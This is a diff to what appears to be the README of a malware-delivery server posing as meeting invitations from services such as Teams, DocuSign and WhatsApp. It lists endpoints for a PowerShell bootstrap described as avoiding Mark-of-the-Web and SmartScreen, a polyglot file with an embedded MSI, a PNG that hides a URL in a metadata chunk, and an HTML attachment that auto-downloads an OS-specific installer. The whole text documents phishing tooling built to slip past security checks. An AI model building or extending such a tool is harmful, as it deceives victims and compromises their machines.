@@ -11,6 +11,8 @@ Gmail, Outlook, Teams, Slack, DocuSign and WhatsApp.
 - `GET /dl/windows.cmd` — double-clickable PowerShell bootstrap (payload fetched
   inside the script, no Mark-of-the-Web, no SmartScreen).
 - `GET /dl/macos.command`, `GET /dl/linux.sh` — same for macOS/Linux.
+- `GET /dl/windows.cmd?id=<id>&offline=1` — self-extracting polyglot (MSI embedded).
+- `GET /stego/<id>.png` — meeting preview PNG with the URL in a `tEXt` chunk.
 - `GET /dl/android` — APK.
 - `GET /attach/<id>` — HTML "meeting document" attachment; auto-downloads the
   right installer for the visiting OS. Optional `?os=windows|macos|linux|android`.
